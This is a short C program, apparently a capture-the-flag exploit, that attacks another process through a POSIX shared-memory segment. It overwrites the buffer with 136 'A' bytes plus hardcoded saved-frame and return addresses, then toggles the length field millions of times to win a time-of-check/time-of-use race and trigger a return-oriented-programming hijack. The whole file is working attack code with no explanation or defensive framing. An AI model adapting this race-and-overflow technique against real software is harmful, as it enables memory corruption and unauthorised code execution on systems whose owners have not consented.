#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define MAX_STR_LEN 1280

typedef struct req {
    unsigned char len;
    char shift;
    char buf[MAX_STR_LEN];
} shm_req_t;

int main(int argc, char** argv) {
    if(argc != 2) {
        fprintf(stderr, "Usage: %s <name>\n", argv[0]);
        exit(1);
    }

    int fd = -1;
    while (1) {
        fd = shm_open(argv[1], O_RDWR | O_CREAT | O_EXCL, 0);
        if (fd == -1) {
            // already exists
            fd = shm_open(argv[1], O_RDWR, 0);
            shm_req_t* shm_req = mmap(NULL, sizeof(shm_req_t), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
            if(shm_req == MAP_FAILED) {
                fprintf(stderr, "mmap error");
                exit(1);
            }
            memset(&shm_req->buf, 'A', 136);
            long bss = 0x404090;
            memcpy(&(shm_req->buf)[136], &bss, 8);
            long rip = 0x40124c;
            memcpy(&(shm_req->buf)[136+8*4], &rip, 8);

            // we begin our TOCTOU exploit
            int attempts = 0;
            while (attempts++ < 10000000) {
                shm_req->len = 500;
                shm_req->len = 4;
            }

            puts("sleeping.. gonna exit soon. hope for rop");
            sleep(1);
            shm_req->len = 0; // get the program to exit
            break;
        } else {
            // does not exist, and we created a new shm
            close(fd);
            shm_unlink(argv[1]);
        }
    }
}